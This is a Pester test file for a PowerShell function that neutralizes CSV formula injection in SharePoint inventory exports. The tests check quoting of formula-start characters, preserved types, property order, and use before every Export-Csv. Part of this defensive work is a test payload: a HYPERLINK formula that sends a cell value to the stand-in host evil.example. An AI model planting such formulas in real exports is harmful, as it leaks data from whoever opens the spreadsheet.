# Behavior tests for ConvertTo-SPSCsvSafeRecord (pure, no farm needed).
BeforeDiscovery {
    # Every character a spreadsheet may read as the start of a formula.
    $script:StartCases = @(
        @{ Name = 'an equals sign'; Start = '=' }
        @{ Name = 'a plus sign'; Start = '+' }
        @{ Name = 'a minus sign'; Start = '-' }
        @{ Name = 'an at sign'; Start = '@' }
        @{ Name = 'a tab'; Start = "`t" }
        @{ Name = 'a carriage return'; Start = "`r" }
        @{ Name = 'a line feed'; Start = "`n" }
        @{ Name = 'a full-width equals sign'; Start = [string][char]0xFF1D }
        @{ Name = 'a full-width plus sign'; Start = [string][char]0xFF0B }
        @{ Name = 'a full-width minus sign'; Start = [string][char]0xFF0D }
        @{ Name = 'a full-width at sign'; Start = [string][char]0xFF20 }
    )
}

BeforeAll {
    $repoRoot   = Split-Path -Path $PSScriptRoot -Parent
    $modulePath = Join-Path -Path $repoRoot -ChildPath 'src/Modules/SPSSiteInventory.Common/SPSSiteInventory.Common.psd1'
    Import-Module -Name $modulePath -Force

    $script:RepoRoot = $repoRoot

    # ConvertTo-SPSCsvSafeRecord is private; reach it inside the module scope.
    $script:Module = Get-Module -Name SPSSiteInventory.Common

    function Invoke-Safe {
        param ([object]$Records)
        @(& $script:Module { param ($Rows) $Rows | ConvertTo-SPSCsvSafeRecord } $Records)
    }
}

Describe 'ConvertTo-SPSCsvSafeRecord' {
    It 'puts a single quote in front of text that starts with <Name>' -ForEach $script:StartCases {
        $text = $Start + 'HYPERLINK("http://evil.example/?x="&A1,"Click")'

        $safe = Invoke-Safe -Records ([PSCustomObject]@{ Title = $text })

        $safe | Should -HaveCount 1
        $safe[0].Title | Should -BeExactly ("'" + $text)
    }

    It 'leaves text that only has <Label> after its first character' -ForEach @(
        @{ Label = 'an equals sign'; Text = 'a=b' }
        @{ Label = 'spaces around an equals sign'; Text = 'Budget = 5' }
        @{ Label = 'a hyphen'; Text = 'x-y' }
        @{ Label = 'a spaced hyphen'; Text = 'A - B' }
        @{ Label = 'an at sign'; Text = 'user@contoso.com' }
        @{ Label = 'a plus sign'; Text = '1+1' }
        @{ Label = 'a tab'; Text = "two`tcolumns" }
        @{ Label = 'a line feed'; Text = "two`nlines" }
        @{ Label = 'a URL'; Text = 'https://intranet/sites/a' }
        @{ Label = 'a full-width equals sign'; Text = ('a' + [char]0xFF1D + 'b') }
        @{ Label = 'accented text'; Text = 'Réunion équipe' }
    ) {
        $safe = Invoke-Safe -Records ([PSCustomObject]@{ Title = $Text })

        $safe[0].Title | Should -BeExactly $Text
    }

    It 'leaves <Label> alone' -ForEach @(
        @{ Label = 'empty text'; Text = '' }
        @{ Label = 'text that starts with a quote'; Text = "'abc" }
        @{ Label = 'a formula that already starts with a quote'; Text = "'=1+1" }
    ) {
        $safe = Invoke-Safe -Records ([PSCustomObject]@{ Title = $Text })

        $safe[0].Title | Should -BeExactly $Text
    }

    It 'leaves values that are not text alone, negative numbers included, so they stay numbers' {
        $id = [guid]::NewGuid()
        $when = [datetime]'2026-10-27T08:30:00'
        $record = [PSCustomObject]@{
            Int = -5; Long = [long]-7; Double = -1.5; Decimal = [decimal]-2.5
            Flag = $true; When = $when; Id = $id; Nothing = $null
        }

        $safe = (Invoke-Safe -Records $record)[0]

        $safe.Int | Should -BeOfType [int]
        $safe.Int | Should -Be -5
        $safe.Long | Should -BeOfType [long]
        $safe.Long | Should -Be -7
        $safe.Double | Should -BeOfType [double]
        $safe.Double | Should -Be -1.5
        $safe.Decimal | Should -BeOfType [decimal]
        $safe.Decimal | Should -Be -2.5
        $safe.Flag | Should -BeOfType [bool]
        $safe.Flag | Should -BeTrue
        $safe.When | Should -Be $when
        $safe.Id | Should -Be $id
        $safe.Nothing | Should -BeNullOrEmpty
    }

    It 'treats a string that looks like a number as text, because it cannot be told from text typed by a user' {
        $safe = (Invoke-Safe -Records ([PSCustomObject]@{ Value = '-5'; Other = '+3' }))[0]

        $safe.Value | Should -BeExactly "'-5"
        $safe.Other | Should -BeExactly "'+3"
    }

    It 'keeps the property names in their order and works on a copy, so the original still feeds the JSON files' {
        $record = [PSCustomObject]@{ Zeta = '=x'; Alpha = 'plain'; Mid = 3; Beta = '-y'; Omega = $null; Gamma = 'z'; Delta = $true; Kappa = '@w' }

        $safe = (Invoke-Safe -Records $record)[0]

        @($safe.PSObject.Properties.Name) | Should -Be @('Zeta', 'Alpha', 'Mid', 'Beta', 'Omega', 'Gamma', 'Delta', 'Kappa')
        $safe.Zeta | Should -BeExactly "'=x"
        $safe.Alpha | Should -BeExactly 'plain'
        $safe.Mid | Should -Be 3
        $safe.Beta | Should -BeExactly "'-y"
        $safe.Omega | Should -BeNullOrEmpty
        $safe.Delta | Should -BeTrue
        $safe.Kappa | Should -BeExactly "'@w"
        $record.Zeta | Should -BeExactly '=x'
        [object]::ReferenceEquals($safe, $record) | Should -BeFalse
    }

    It 'does not add a second quote when it is applied twice' {
        $once = (Invoke-Safe -Records ([PSCustomObject]@{ Title = '@SUM(A1)' }))[0]
        $twice = (Invoke-Safe -Records $once)[0]

        $once.Title | Should -BeExactly "'@SUM(A1)"
        $twice.Title | Should -BeExactly "'@SUM(A1)"
    }

    It 'handles every record of the pipeline in order, and nothing for an empty pipeline' {
        $rows = @(
            [PSCustomObject]@{ Name = '=a' }
            [PSCustomObject]@{ Name = 'b' }
            [PSCustomObject]@{ Name = '@c' }
        )

        $safe = Invoke-Safe -Records $rows

        $safe | Should -HaveCount 3
        $safe[0].Name | Should -BeExactly "'=a"
        $safe[1].Name | Should -BeExactly 'b'
        $safe[2].Name | Should -BeExactly "'@c"
        @(Invoke-Safe -Records @()) | Should -HaveCount 0
    }

    It 'skips a null record and accepts records given as a parameter' {
        $first = [PSCustomObject]@{ Name = '=a' }
        $second = [PSCustomObject]@{ Name = '-b' }

        $piped = @(& $script:Module { param ($One, $Two) @($null, $One, $Two) | ConvertTo-SPSCsvSafeRecord } $first $second)
        $byParameter = @(& $script:Module { param ($One, $Two) ConvertTo-SPSCsvSafeRecord -InputObject @($One, $Two) } $first $second)

        $piped | Should -HaveCount 2
        $piped[0].Name | Should -BeExactly "'=a"
        $byParameter | Should -HaveCount 2
        $byParameter[1].Name | Should -BeExactly "'-b"
    }

    It 'is applied before every Export-Csv of the module, so that a new exporter cannot forget it' {
        $found = 0
        foreach ($file in (Get-ChildItem -Path (Join-Path -Path $script:RepoRoot -ChildPath 'src') -Recurse -Filter '*.ps1')) {
            $tokens = $null
            $errors = $null
            $ast = [System.Management.Automation.Language.Parser]::ParseFile($file.FullName, [ref]$tokens, [ref]$errors)
            $exports = $ast.FindAll({ param ($node) $node -is [System.Management.Automation.Language.CommandAst] -and $node.GetCommandName() -eq 'Export-Csv' }, $true)
            foreach ($export in $exports) {
                $found++
                $before = @(
                    foreach ($element in $export.Parent.PipelineElements) {
                        if ($element.Extent.StartOffset -lt $export.Extent.StartOffset -and $element -is [System.Management.Automation.Language.CommandAst]) {
                            $element.GetCommandName()
                        }
                    }
                )
                $before | Should -Contain 'ConvertTo-SPSCsvSafeRecord' -Because ('{0} line {1} writes a CSV without neutralizing formulas' -f $file.Name, $export.Extent.StartLineNumber)
            }
        }

        $found | Should -BeGreaterOrEqual 8
    }

    It 'writes the quote and leaves the header and the numbers alone in the CSV file, the way the exporters call it' {
        $path = Join-Path -Path $TestDrive -ChildPath 'safe.csv'
        $rows = @(
            [PSCustomObject]@{ Title = '=1+1'; Count = -5; Note = 'plain'; Extra = 'dropped' }
            [PSCustomObject]@{ Title = "Quote ""inside"""; Count = 2; Note = '@x'; Extra = 'dropped' }
        )

        & $script:Module { param ($Source, $Target)
            $Source | Select-Object -Property Title, Count, Note | ConvertTo-SPSCsvSafeRecord | Export-Csv -Path $Target -NoTypeInformation -Encoding UTF8
        } $rows $path
        $lines = @(Get-Content -Path $path)

        $lines | Should -HaveCount 3
        $lines[0] | Should -BeExactly '"Title","Count","Note"'
        $lines[1] | Should -BeExactly '"''=1+1","-5","plain"'
        $lines[2] | Should -BeExactly '"Quote ""inside""","2","''@x"'
    }
}
